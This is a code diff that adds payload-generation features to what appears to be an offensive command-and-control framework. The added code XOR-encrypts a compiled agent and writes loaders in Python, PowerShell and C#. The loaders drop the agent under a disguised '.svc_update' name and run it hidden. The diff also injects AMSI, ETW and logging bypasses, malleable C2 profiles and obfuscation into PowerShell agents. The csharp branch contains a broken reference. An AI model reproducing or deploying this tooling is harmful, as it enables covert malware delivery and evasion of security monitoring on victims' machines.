+                                  target_arch: str = 'amd64',
+                                  output_format: str = 'raw') -> str:
+        """Generate raw shellcode from the Go agent for BYO-loader/BYO-C2 use.
+
+        Compiles the Go agent, then wraps it in a position-independent
+        shellcode stub. Output formats: raw, c, python, powershell, csharp.
+
+        This lets operators use their own loaders, injectors, or C2 frameworks
+        to deliver and execute the SockPuppets agent.
+        """
+        # First compile the Go agent
+        agent_path = self.generate_go_agent(
+            c2_host, c2_port, encryption_key=encryption_key or 'SOCKPUPPETS_KEY_2026',
+            transport=transport, beacon_interval=beacon_interval,
+            target_os='windows', target_arch=target_arch, garble=False
+        )
+        if agent_path.startswith('Error'):
+            return agent_path
+
+        with open(agent_path, 'rb') as f:
+            pe_data = f.read()
+
+        # XOR-encrypt the PE
+        xor_key = os.urandom(16)
+        encrypted_pe = bytes(b ^ xor_key[i % 16] for i, b in enumerate(pe_data))
+
+        sc_name = f"shellcode_{self.random_string(8)}_{target_arch}"
+
+        if output_format == 'raw':
+            out_path = self.output_dir / f"{sc_name}.bin"
+            # Write: key(16) + pe_length(4) + encrypted_pe
+            with open(out_path, 'wb') as f:
+                f.write(xor_key)
+                f.write(struct.pack('<I', len(pe_data)))
+                f.write(encrypted_pe)
+
+        elif output_format == 'c':
+            hex_key = ', '.join(f'0x{b:02x}' for b in xor_key)
+            hex_pe = ', '.join(f'0x{b:02x}' for b in encrypted_pe[:200]) + ' /* ... */'
+            out_path = self.output_dir / f"{sc_name}.h"
+            with open(out_path, 'w') as f:
+                f.write(f'unsigned char xor_key[] = {{ {hex_key} }};\n')
+                f.write(f'unsigned int pe_length = {len(pe_data)};\n')
+                f.write(f'unsigned char encrypted_pe[] = {{ {hex_pe} }};\n')
+                f.write(f'// Total size: {len(encrypted_pe)} bytes\n')
+                f.write(f'// Decrypt: for(int i=0; i<pe_length; i++) pe[i] = encrypted_pe[i] ^ xor_key[i%16];\n')
+
+        elif output_format == 'python':
+            out_path = self.output_dir / f"{sc_name}.py"
+            import base64 as _b64
+            b64_key = _b64.b64encode(xor_key).decode()
+            b64_pe = _b64.b64encode(encrypted_pe).decode()
+            with open(out_path, 'w') as f:
+                f.write(f'import base64, ctypes, os\n')
+                f.write(f'key = base64.b64decode("{b64_key}")\n')
+                f.write(f'enc = base64.b64decode("{b64_pe}")\n')
+                f.write(f'pe = bytes(enc[i] ^ key[i%16] for i in range(len(enc)))\n')
+                f.write(f'# Write and execute, or inject into memory\n')
+                f.write(f'tmp = os.path.join(os.environ.get("TEMP","/tmp"), ".svc_update")\n')
+                f.write(f'with open(tmp, "wb") as f: f.write(pe)\n')
+                f.write(f'os.chmod(tmp, 0o755) if os.name != "nt" else None\n')
+                f.write(f'os.system(tmp)\n')
+
+        elif output_format == 'powershell':
+            out_path = self.output_dir / f"{sc_name}.ps1"
+            import base64 as _b64
+            b64_key = _b64.b64encode(xor_key).decode()
+            b64_pe = _b64.b64encode(encrypted_pe).decode()
+            with open(out_path, 'w') as f:
+                f.write(f'$key = [Convert]::FromBase64String("{b64_key}")\n')
+                f.write(f'$enc = [Convert]::FromBase64String("{b64_pe}")\n')
+                f.write(f'$pe = New-Object byte[] $enc.Length\n')
+                f.write(f'for ($i=0; $i -lt $enc.Length; $i++) {{ $pe[$i] = $enc[$i] -bxor $key[$i%16] }}\n')
+                f.write(f'$tmp = "$env:TEMP\\.svc_update.exe"\n')
+                f.write(f'[IO.File]::WriteAllBytes($tmp, $pe)\n')
+                f.write(f'Start-Process -WindowStyle Hidden $tmp\n')
+
+        elif output_format == 'csharp':
+            out_path = self.output_dir / f"{sc_name}.cs"
+            hex_key = string.join(', ', [f'0x{b:02x}' for b in xor_key]) if hasattr(string, 'join') else ', '.join(f'0x{b:02x}' for b in xor_key)
+            with open(out_path, 'w') as f:
+                f.write('using System;\nusing System.IO;\nusing System.Diagnostics;\n\n')
+                f.write('class Loader {\n')
+                f.write(f'    static byte[] key = new byte[] {{ {hex_key} }};\n')
+                f.write(f'    static int peLen = {len(pe_data)};\n')
+                f.write('    static void Main() {\n')
+                f.write(f'        byte[] enc = Convert.FromBase64String("{_b64.b64encode(encrypted_pe).decode()}");\n')
+                f.write('        byte[] pe = new byte[enc.Length];\n')
+                f.write('        for (int i = 0; i < enc.Length; i++) pe[i] = (byte)(enc[i] ^ key[i%16]);\n')
+                f.write('        string tmp = Path.Combine(Path.GetTempPath(), ".svc_update.exe");\n')
+                f.write('        File.WriteAllBytes(tmp, pe);\n')
+                f.write('        Process.Start(new ProcessStartInfo(tmp) { WindowStyle = ProcessWindowStyle.Hidden });\n')
+                f.write('    }\n}\n')
+
+        else:
+            return f"Error: Unknown format {output_format}"
+
+        print(f"[+] Shellcode blob: {out_path}")
+        print(f"    PE size: {len(pe_data)} bytes")
+        print(f"    Encrypted: {len(encrypted_pe)} bytes")
+        print(f"    Format: {output_format}")
+        print(f"    Usage: Decrypt with XOR key, write to disk or inject into memory")
+        return str(out_path)
 
     def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                                    transport: str = 'websocket', beacon_interval: int = 60,
@@ -1024,6 +1832,17 @@ def {cmd_func}(cmd):
             content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
             content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
             content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
+
+        # Inject evasion module (AMSI, ETW, ntdll unhook, script block logging)
+        if self._evasion_ps_code:
+            evasion_block = self._prepare_powershell_evasion()
+            # Insert at the top of the script
+            content = evasion_block + content
+            print(f"[*] Injected PS evasion: AMSI bypass, ETW bypass, ntdll unhook, ScriptBlock bypass")
+
+        # Inject malleable C2 profile for HTTP transport
+        if self._malleable_profiles and transport in ('http', 'https'):
+            content = self._inject_malleable_profile(content, transport)
 
         # Apply polymorphic obfuscation
         content = self.obfuscate_powershell(content)
